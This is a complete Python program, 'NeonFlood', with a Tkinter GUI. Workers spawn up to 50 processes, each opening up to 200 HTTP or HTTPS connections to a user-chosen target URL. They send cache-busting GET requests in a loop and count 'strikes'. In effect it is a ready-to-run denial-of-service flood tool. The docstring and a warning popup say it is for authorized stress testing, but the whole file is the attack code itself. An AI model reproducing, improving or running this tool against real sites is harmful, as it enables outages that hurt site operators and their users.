#!/usr/bin/env python3
"""
NeonFlood - Cyberpunk-themed network load simulation tool.
For educational and authorized stress testing ONLY.
Developer: NH Prince | https://nhprince.dpdns.org
"""

import tkinter as tk
from tkinter import scrolledtext, messagebox
from multiprocessing import Process, Manager, Value, Queue
import urllib.parse
import ssl
import random
import time
import threading
import queue as queue_module
import http.client
import webbrowser
import sys


# ──────────────────────────────────────────────
#  Thread-safe counters
# ──────────────────────────────────────────────

class SafeCounter:
    def __init__(self, manager):
        self.hits  = manager.Value('i', 0)
        self.fails = manager.Value('i', 0)
        self._hl   = manager.Lock()
        self._fl   = manager.Lock()

    def add_hit(self):
        with self._hl: self.hits.value += 1

    def add_fail(self):
        with self._fl: self.fails.value += 1

    @property
    def hit_count(self):  return self.hits.value
    @property
    def fail_count(self): return self.fails.value


# ──────────────────────────────────────────────
#  Core worker process
# ──────────────────────────────────────────────

class Striker(Process):
    def __init__(self, url, nr_sockets, counter, log_queue):
        super().__init__()
        self.counter   = counter
        self.nr_socks  = nr_sockets
        self.log_queue = log_queue
        self._runnable = Value('b', True)

        parsed    = urllib.parse.urlparse(url)
        self.ssl  = parsed.scheme == 'https'
        self.host = parsed.netloc.split(':')[0]
        self.path = parsed.path or '/'
        self.port = parsed.port or (443 if self.ssl else 80)

    def stop(self):
        with self._runnable.get_lock():
            self._runnable.value = False

    @property
    def runnable(self): return self._runnable.value

    def run(self):
        while self.runnable:
            socks = []
            try:
                self.report("LOAD", f"Initializing {self.nr_socks} sockets...")
                for _ in range(self.nr_socks):
                    if not self.runnable: break
                    try:
                        if self.ssl:
                            ctx  = ssl._create_unverified_context()
                            conn = http.client.HTTPSConnection(self.host, self.port, context=ctx, timeout=5)
                        else:
                            conn = http.client.HTTPConnection(self.host, self.port, timeout=5)
                        socks.append(conn)
                    except Exception as e:
                        self.report("FAIL", f"Connection rejected: {e}")

                for conn in socks:
                    if not self.runnable: break
                    try:
                        req = f"{self.path}?{random.randint(1,9999)}={random.randint(1,9999)}"
                        conn.request("GET", req, None, {
                            "User-Agent": "NeonFlood/1.0",
                            "Cache-Control": "no-cache"
                        })
                    except Exception as e:
                        self.report("WARN", f"Socket hangup: {e}")

                for conn in socks:
                    if not self.runnable: break
                    try:
                        res = conn.getresponse()
                        if res.status < 400:
                            self.counter.add_hit()
                            self.report("HIT", f"Strike successful — HTTP {res.status}")
                        else:
                            self.counter.add_fail()
                            self.report("FAIL", f"Server blocked — HTTP {res.status}")
                    except Exception:
                        self.counter.add_fail()
                        self.report("FAIL", "Remote host closed connection")

                for conn in socks:
                    try: conn.close()
                    except: pass

            except Exception as e:
                self.report("FAIL", f"Process error: {e}")
                time.sleep(1)

    def report(self, level, msg):
        self.log_queue.put((level, msg))


# ──────────────────────────────────────────────
#  Custom Warning Popup
#  Called via root.after() so mainloop is running
# ──────────────────────────────────────────────

def show_warning_popup(root):
    popup = tk.Toplevel(root)
    popup.title("NeonFlood — Warning")
    popup.configure(bg="#050505")
    popup.resizable(False, False)
    popup.attributes("-topmost", True)

    W, H = 560, 470
    root.update_idletasks()
    sw = root.winfo_screenwidth()
    sh = root.winfo_screenheight()
    popup.geometry(f"{W}x{H}+{(sw - W) // 2}+{(sh - H) // 2}")

    popup.grab_set()
    popup.lift()
    popup.focus_force()

    # ── Red neon border ──
    border = tk.Frame(popup, bg="#FF003C", padx=2, pady=2)
    border.pack(fill="both", expand=True, padx=8, pady=8)
    inner = tk.Frame(border, bg="#0a0a0a")
    inner.pack(fill="both", expand=True, padx=1, pady=1)

    # ── Glitch title ──
    glitch_lbl = tk.Label(
        inner, text="⚠  WARNING  ⚠",
        font=("Courier", 22, "bold"),
        bg="#0a0a0a", fg="#FF003C"
    )
    glitch_lbl.pack(pady=(20, 2))

    tk.Label(
        inner, text="[ UNAUTHORIZED USE IS ILLEGAL ]",
        font=("Courier", 9), bg="#0a0a0a", fg="#FF6600"
    ).pack(pady=(0, 10))

    # Divider
    tk.Frame(inner, bg="#FF003C", height=1).pack(fill="x", padx=18, pady=(0, 10))

    # ── Warning lines ──
    body = tk.Frame(inner, bg="#0a0a0a")
    body.pack(padx=28, fill="x")
    for text, color in [
        ("»  FOR AUTHORIZED & EDUCATIONAL USE ONLY.",   "#00FF00"),
        ("»  DO NOT test systems you do not own.",       "#FFFF00"),
        ("»  DO NOT use without explicit permission.",   "#FFFF00"),
        ("»  Misuse may violate local & federal laws.",  "#FF6600"),
        ("»  You bear FULL responsibility for all use.", "#FF003C"),
    ]:
        tk.Label(body, text=text, font=("Courier", 10),
                 bg="#0a0a0a", fg=color, anchor="w", justify="left"
                 ).pack(fill="x", pady=3)

    # Divider
    tk.Frame(inner, bg="#333", height=1).pack(fill="x", padx=18, pady=(12, 8))

    # ── Developer credit ──
    dev_row = tk.Frame(inner, bg="#0a0a0a")
    dev_row.pack()
    tk.Label(dev_row, text="DEVELOPER: ", font=("Courier", 10),
             bg="#0a0a0a", fg="#555555").pack(side="left")
    tk.Label(dev_row, text="NH Prince", font=("Courier", 10, "bold"),
             bg="#0a0a0a", fg="#00FFFF").pack(side="left")

    # ── Clickable website link ──
    link_row = tk.Frame(inner, bg="#0a0a0a")
    link_row.pack(pady=(5, 0))
    tk.Label(link_row, text="WEBSITE:   ", font=("Courier", 10),
             bg="#0a0a0a", fg="#555555").pack(side="left")

    link_lbl = tk.Label(
        link_row,
        text="nhprince.dpdns.org  ↗",
        font=("Courier", 10, "bold", "underline"),
        bg="#0a0a0a", fg="#BF00FF",
        cursor="hand2"
    )
    link_lbl.pack(side="left")
    link_lbl.bind("<Button-1>", lambda e: webbrowser.open("https://nhprince.dpdns.org"))
    link_lbl.bind("<Enter>",    lambda e: link_lbl.config(fg="#FF00FF"))
    link_lbl.bind("<Leave>",    lambda e: link_lbl.config(fg="#BF00FF"))

    # Divider
    tk.Frame(inner, bg="#FF003C", height=1).pack(fill="x", padx=18, pady=(12, 0))

    # ── Accept button ──
    stop_flag = {"stop": False}

    def on_accept():
        stop_flag["stop"] = True
        popup.grab_release()
        popup.destroy()

    btn = tk.Button(
        inner,
        text="[ I UNDERSTAND — ENTER ]",
        font=("Courier", 11, "bold"),
        bg="#0a0a0a", fg="#FF003C",
        activebackground="#FF003C", activeforeground="#000",
        relief="flat", bd=0, padx=16, pady=9,
        cursor="hand2",
        command=on_accept
    )
    btn.pack(pady=16)
    btn.bind("<Enter>", lambda e: btn.config(bg="#1a0000", fg="#FF6666"))
    btn.bind("<Leave>", lambda e: btn.config(bg="#0a0a0a", fg="#FF003C"))

    # ── Glitch animation ──
    g_colors = ["#FF003C", "#FF6600", "#FFFF00", "#FF003C", "#FFFFFF", "#FF003C", "#FF003C"]
    g_texts  = [
        "⚠  WARNING  ⚠", "W̴A̷R̸N̵I̶N̴G̷", "⚠  WARNING  ⚠",
        "▓▓ WARNING ▓▓", "⚠  WARNING  ⚠", "!! WARNING !!", "⚠  WARNING  ⚠"
    ]

    def glitch(i=0):
        if stop_flag["stop"]: return
        try:
            glitch_lbl.config(
                fg=g_colors[i % len(g_colors)],
                text=g_texts[i % len(g_texts)]
            )
            popup.after(random.choice([90, 70, 180, 55, 280, 130, 400]), glitch, i + 1)
        except tk.TclError:
            pass  # popup already destroyed

    glitch()
    root.wait_window(popup)


# ──────────────────────────────────────────────
#  Main GUI
# ──────────────────────────────────────────────

class GorgeousHackerGUI:
    def __init__(self, root):
        self.root      = root
        self.active    = False
        self.workers   = []
        self.log_queue = Queue()
        self.manager   = None
        self.counter   = None

        self.root.title("NeonFlood")
        self.root.geometry("920x780")
        self.root.configure(bg="#050505")
        self.root.resizable(True, True)

        self._build_ui()

        # Defer popup until mainloop is running — fixes popup not showing
        self.root.after(150, lambda: show_warning_popup(self.root))

        # Log polling daemon thread
        threading.Thread(target=self._poll_logs, daemon=True).start()

    # ── UI ────────────────────────────────────

    def _build_ui(self):
        tk.Label(
            self.root, text=">> NeonFlood <<",
            font=("Fixedsys", 20), bg="#050505", fg="#00FF00"
        ).pack(pady=15)

        ctrl = tk.Frame(self.root, bg="#111")
        ctrl.pack(fill="x", padx=30, pady=5)

        tk.Label(ctrl, text="TARGET URL:", bg="#111", fg="#00FF00",
                 font=("Courier", 10)).grid(row=0, column=0, padx=10, pady=10, sticky="w")

        # insertbackground = visible cursor color
        self.url_entry = tk.Entry(
            ctrl, width=42,
            bg="#0d0d0d", fg="#00FF00",
            font=("Courier", 10), relief="flat",
            insertbackground="#00FF00",
            highlightthickness=1,
            highlightcolor="#00FF00",
            highlightbackground="#333333"
        )
        self.url_entry.insert(0, "http://")
        self.url_entry.grid(row=0, column=1, pady=10, ipady=4)

        tk.Label(ctrl, text="PROCESSES:", bg="#111", fg="#00FF00",
                 font=("Courier", 10)).grid(row=0, column=2, padx=10)

        self.w_spin = tk.Spinbox(
            ctrl, from_=1, to=50, width=5,
            bg="#0d0d0d", fg="#00FF00", font=("Courier", 10),
            buttonbackground="#222", relief="flat",
            insertbackground="#00FF00",
            highlightthickness=1, highlightcolor="#00FF00",
            highlightbackground="#333333"
        )
        self.w_spin.grid(row=0, column=3, padx=5)

        tk.Label(ctrl, text="SOCKETS/WORKER:", bg="#111", fg="#00FF00",
                 font=("Courier", 10)).grid(row=1, column=0, padx=10, pady=(0, 10), sticky="w")

        self.sock_spin = tk.Spinbox(
            ctrl, from_=1, to=200, width=5,
            bg="#0d0d0d", fg="#00FF00", font=("Courier", 10),
            buttonbackground="#222", relief="flat",
            insertbackground="#00FF00",
            highlightthickness=1, highlightcolor="#00FF00",
            highlightbackground="#333333"
        )
        self.sock_spin.delete(0, tk.END)
        self.sock_spin.insert(0, "50")
        self.sock_spin.grid(row=1, column=1, pady=(0, 10), sticky="w", ipady=2)

        stats = tk.Frame(self.root, bg="#050505")
        stats.pack(pady=5)
        self.hits_lbl = tk.Label(stats, text="STRIKES: 0",
                                  font=("Courier", 14, "bold"), bg="#050505", fg="#00FF00")
        self.hits_lbl.pack(side="left", padx=40)
        self.fails_lbl = tk.Label(stats, text="DROPPED: 0",
                                   font=("Courier", 14, "bold"), bg="#050505", fg="#FF0000")
        self.fails_lbl.pack(side="left", padx=40)

        self.console = scrolledtext.ScrolledText(
            self.root, height=22,
            bg="#000", fg="#00FF00",
            font=("Courier", 9), relief="flat",
            insertbackground="#00FF00"
        )
        self.console.pack(fill="both", expand=True, padx=30, pady=10)
        self.console.tag_config("HIT",  foreground="#00FF00")
        self.console.tag_config("FAIL", foreground="#FF0000")
        self.console.tag_config("WARN", foreground="#FFFF00")
        self.console.tag_config("LOAD", foreground="#BF00FF")
        self.console.tag_config("SYS",  foreground="#00FFFF")
        self.console.tag_config("TS",   foreground="#444444")

        self.btn = tk.Button(
            self.root,
            text="[ INITIALIZE STRIKE ]",
            font=("Courier", 12, "bold"),
            bg="#0d0d0d", fg="#00FF00",
            activebackground="#00FF00", activeforeground="#000",
            relief="flat", cursor="hand2",
            command=self.toggle
        )
        self.btn.pack(pady=20)
        self.btn.bind("<Enter>", lambda e: self.btn.config(bg="#001a00"))
        self.btn.bind("<Leave>", lambda e: self.btn.config(bg="#0d0d0d"))

    # ── Validation ────────────────────────────

    def _validate_url(self, url):
        url = url.strip()
        if not url.startswith(("http://", "https://")):
            messagebox.showerror("INVALID INPUT", "URL must start with http:// or https://")
            return False
        try:
            parsed = urllib.parse.urlparse(url)
            if not parsed.netloc or not parsed.hostname:
                raise ValueError("Missing hostname")
            if parsed.port and not (1 <= parsed.port <= 65535):
                raise ValueError("Port out of range")
        except ValueError as e:
            messagebox.showerror("INVALID INPUT", f"Malformed URL: {e}")
            return False
        return True

    def _validate_spinboxes(self):
        try:
            w = int(self.w_spin.get())
            s = int(self.sock_spin.get())
            if w < 1 or s < 1: raise ValueError
        except ValueError:
            messagebox.showerror("INVALID INPUT", "Processes and Sockets must be positive integers.")
            return None, None
        return w, s

    # ── Log Polling ───────────────────────────

    def _poll_logs(self):
        while True:
            try:
                level, msg = self.log_queue.get(timeout=0.1)
                ts = time.strftime('%H:%M:%S')
                self.console.insert(tk.END, f"[{ts}] ", "TS")
                self.console.insert(tk.END, f"{level}: {msg}\n", level)
                self.console.see(tk.END)
                if int(self.console.index('end-1c').split('.')[0]) > 800:
                    self.console.delete('1.0', '101.0')
            except queue_module.Empty:
                continue
            except Exception as e:
                print(f"[poll_logs] {e}", file=sys.stderr)

    # ── Start / Stop ──────────────────────────

    def toggle(self):
        if not self.active: self._start()
        else:               self._shutdown()

    def _start(self):
        url = self.url_entry.get().strip()
        if not self._validate_url(url): return
        workers, socks = self._validate_spinboxes()
        if workers is None: return

        self.manager = Manager()
        self.counter = SafeCounter(self.manager)
        self.active  = True
        self.btn.config(text="[ TERMINATE SESSION ]", fg="#FF0000")
        self.log_queue.put(("SYS", f"ENGINE STARTING — {workers} workers x {socks} sockets"))

        for _ in range(workers):
            p = Striker(url, socks, self.counter, self.log_queue)
            p.daemon = True
            p.start()
            self.workers.append(p)

        self._update_stats()

    def _update_stats(self):
        if self.active and self.counter:
            self.hits_lbl.config(text=f"STRIKES: {self.counter.hit_count}")
            self.fails_lbl.config(text=f"DROPPED: {self.counter.fail_count}")
            self.root.after(500, self._update_stats)

    def _shutdown(self):
        self.active = False
        for p in self.workers:
            try: p.stop()
            except: pass
        time.sleep(0.3)
        for p in self.workers:
            try: p.terminate(); p.join(timeout=2)
            except: pass
        self.workers.clear()
        if self.manager:
            try: self.manager.shutdown()
            except: pass
            self.manager = None
        self.counter = None
        self.btn.config(text="[ INITIALIZE STRIKE ]", fg="#00FF00")
        self.log_queue.put(("SYS", "SESSION TERMINATED BY OPERATOR"))


# ──────────────────────────────────────────────
#  Entry Point
# ──────────────────────────────────────────────

if __name__ == "__main__":
    root = tk.Tk()
    app  = GorgeousHackerGUI(root)
    root.mainloop()